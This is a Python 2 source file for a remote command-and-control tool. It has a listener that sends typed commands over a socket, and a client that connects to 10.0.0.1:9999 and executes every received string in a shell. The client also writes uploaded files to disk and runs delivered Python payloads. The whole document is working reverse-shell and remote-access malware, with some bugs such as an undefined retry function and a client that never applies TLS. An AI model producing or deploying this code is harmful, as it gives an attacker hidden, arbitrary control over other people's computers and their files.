from __future__ import print_function
import socket
import sys
import ssl
cmd = ""


def create():
    try:
        global host
        global port
        global s
        host = 'localhost'
        port = 9999
        s = socket.socket()
        s = ssl.wrap_socket(s, certfile='ia.crt', keyfile='ia.key', ssl_version=ssl.PROTOCOL_TLSv1)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind():
    try:
        global host
        global port
        global s
        print("Binding to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


def accept():
    conn, address = s.accept()
    print("Client connection established: " + "IP " + address[0] + "  Port: " + str(address[1]))
    ssend(conn)
    conn.close()


def ssend(conn):
    while True:
        cmd = raw_input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024))
            print(client_response, end="")


def main():
    create()
    bind()
    accept()


main()



#### client #####
import os
import socket
import subprocess
import ssl

# Create a socket
def create():
    try:
        global host
        global port
        global ssls
        host = '10.0.0.1'
        port = 9999
        s = socket.socket()
        ssls = s
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def connect():
    try:
        global host
        global port
        global s
        ssls.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


# Receive commands from remote server and run on local machine
def receive():
    global s
    while True:
        data = ssls.recv(1024)
       # args = data.decode("utf-8")
        args = data.split()
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        elif data[:4].decode("utf-8") == 'drop':
            f = open(args[1], 'wb')
            filesize = long(args[2])
            ssls.send('ready')
            data = ssls.recv(1024)
            totalRecv = len(data)
            f.write(data)
            while totalRecv < filesize:
                data = ssls.recv(1024)
                totalRecv += len(data)
                f.write(data)
            f.close()
            print('WRITE_FILE_COMPLETE.')
        elif data[:3].decode("utf-8") == 'run':
            ssls.send('ready')
            l = ssls.recv(1024)
            r = l
            print('payload before while loop: ' + r)
            if not 'FILE_TRANSFER_COMPLETE' in str(l):
               while not ('FILE_TRANSFER_COMPLETE' in str(l)):
                  r += ssls.recv(1024)
            else:
                print('payload after 2nd: ' + r)
                runproc('python -c ' + r)
        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes)
            ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    s.close()

def bytes_to_number(b):
    # if Python2.x
    b = map(ord, b)
    res = 0
    for i in range(4):
        res += b[i] << (i*8)
    return res

def runproc(data):
    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    output_str = str(output_bytes)
    ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
    print(output_str)

def main():
    create()
    connect()
    receive()


main()
